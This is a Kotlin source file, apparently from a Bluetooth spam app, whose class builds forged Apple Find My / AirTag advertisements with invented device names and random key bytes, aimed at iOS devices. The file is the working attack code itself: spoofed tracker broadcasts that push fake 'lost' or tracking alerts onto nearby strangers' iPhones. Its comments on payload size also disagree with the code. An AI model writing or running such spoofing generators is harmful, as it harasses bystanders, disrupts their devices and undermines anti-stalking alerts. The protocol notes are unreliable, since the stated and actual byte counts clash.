package com.nlespam.generators

import com.nlespam.models.*
import kotlin.random.Random

class AirTagCloneGenerator : SpamGenerator {
    override val name = "AirTag Clone"

    // Apple Find My / AirTag uses continuity type 0x12 (Find My)
    // Payload: type(1) + length(1) + status(1) + 28 bytes public key data

    val devices = listOf(
        "AirTag" to 0x05,
        "AirTag (Lost)" to 0x07,
        "Find My Backpack" to 0x05,
        "Find My Keys" to 0x05,
        "Find My Wallet" to 0x07,
        "Find My Luggage" to 0x05,
        "AirTag (Moving)" to 0x07,
        "Find My Bike" to 0x05,
        "Find My Headphones" to 0x05,
        "AirTag (Alert)" to 0x07,
    )

    override fun generate(): List<AdvertisementSet> = devices.map { (deviceName, status) ->
        // Find My continuity frame
        val continuityType: Byte = 0x12   // Find My type
        val payloadLength: Byte = 0x19    // 25 bytes
        val statusByte = status.toByte()

        // Generate random 22-byte public key data (simulates a rotating key)
        val publicKey = Random.nextBytes(22)

        val payload = byteArrayOf(continuityType, payloadLength, statusByte) + publicKey

        AdvertisementSet(
            title = deviceName,
            target = AdvertisementTarget.IOS,
            type = SpamType.AIRTAG_CLONE,
            manufacturerData = ManufacturerData(ManufacturerIds.APPLE, payload),
        )
    }
}
